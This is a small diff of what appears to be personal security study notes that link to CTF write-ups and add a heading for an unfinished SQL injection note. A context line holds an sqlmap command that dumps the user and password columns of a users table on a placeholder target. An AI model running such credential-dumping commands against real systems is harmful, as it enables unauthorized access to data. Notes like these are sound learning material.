@@ -87,3 +87,6 @@ sqlmap -u "http://target.com/id=1" -D webapp -T users -C "user,pass" --dump
 ### CTFs
 [[BKSEC - Low Effort SNS]]
 [[BKSEC - Ezzz]]
+
+### Techniques
+[[(incomplete) SQL Injection]]
